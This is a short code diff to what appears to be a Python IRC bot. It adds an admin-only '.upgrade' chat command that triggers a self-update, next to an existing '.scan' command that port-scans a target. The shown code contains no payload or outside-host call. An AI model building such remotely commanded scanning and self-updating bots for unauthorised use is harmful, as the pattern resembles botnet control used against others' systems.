@@ -506,6 +506,10 @@ def main():
                         message = "Only Linux is currently supported."
                     sendntc(message, name)
                                 
+                # Respond to '.upgrade' command from admin.
+                if name.lower() == adminname.lower() and message.find('.upgrade') != -1:
+                    update()
+                               
                 # Respond to '.scan [target] [port(s)]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.scan') != -1:
                     target = message.split(' ', 1)[1]
